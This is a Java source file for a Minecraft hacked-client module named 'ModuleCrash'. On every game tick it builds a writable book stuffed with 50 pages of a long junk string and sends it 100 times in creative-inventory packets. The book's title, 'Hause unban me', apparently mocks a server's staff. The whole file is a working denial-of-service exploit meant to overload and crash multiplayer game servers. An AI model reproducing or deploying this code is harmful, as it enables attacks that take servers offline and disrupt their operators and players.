package me.potentia.client.module;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraftforge.fml.common.gameevent.TickEvent.ClientTickEvent;

public class ModuleCrash extends Module {


    public ModuleCrash(String name) {
        super(name);
    }

    @Override
    public void onEnable() {

    }

    @Override
    public void onDisable() {

    }

    @Override
    public void onTick(ClientTickEvent event) {
        ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
        NBTTagList list = new NBTTagList();
        NBTTagCompound tag = new NBTTagCompound();
        String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        for (int i = 0; i < 50; i++) {
            String siteContent = size;
            NBTTagString tString = new NBTTagString(siteContent);
            list.appendTag(tString);
        }
        tag.setString("author", "Robearttt");
        tag.setString("title", "Hause unban me");
        tag.setTag("pages", list);
        book.setTagInfo("pages", list);
        book.setTagCompound(tag);
        for (int i = 0; i < 100; i++) {
            try {
                Minecraft.getMinecraft().getConnection().sendPacket(new CPacketCreativeInventoryAction(0, book));
            } catch (Exception e) {
            }
        }

    }
}
